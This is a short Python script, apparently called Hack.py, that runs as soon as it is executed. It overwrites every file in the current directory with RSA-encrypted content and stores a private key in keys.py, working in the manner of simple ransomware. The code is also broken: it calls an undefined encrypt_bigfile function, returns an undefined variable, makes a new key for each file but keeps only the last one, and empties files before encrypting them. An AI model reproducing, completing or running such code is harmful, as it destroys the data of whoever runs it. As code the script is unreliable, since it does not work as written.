import os
import codecs
import re
import rsa
# from Crypto.Cipher import XOR

def OpenFile(file_name, mod):
    try:
        the_file = codecs.open(file_name, mod,encoding='utf-8',errors='ignore')
        # the_file = open(file_name, mod)
    except IOError as e:
        print('Can\'t open file - ',file_name,'. Work will be closed \n', e)
    else:
        return the_file

def Main():
    for filename in os.listdir(os.getcwd()):
        if filename != 'Hack.py' and filename != 'deHack.py' and filename != 'keys.py':
            the_file = OpenFile(filename,'r')
            print('New File: '+ filename+'\n')
            string = the_file.read()
            Enstring = ''
            the_file.close()
            the_file = OpenFile(filename, 'w')
            # string = re.sub('[^a-zA-Z]',' ',string)
            encrypted = Encrypt(string, the_file)
            # the_file.write(encrypted[0])
            the_file.close()
    the_file = OpenFile('keys.py','w')
    the_file.write(encrypted[1])
    the_file.close()


def Encrypt(string,out_file):
    (bob_pub, bob_priv) = rsa.newkeys(1024)
    # string = string.encode('utf8')
    encrypt_bigfile(string,out_file,bob_pub)
    return (crypto,bob_priv)
# def xorCoder(string, key):
#     cipher = XOR.new(key)
#     return cipher.encrypt(string)


Main()

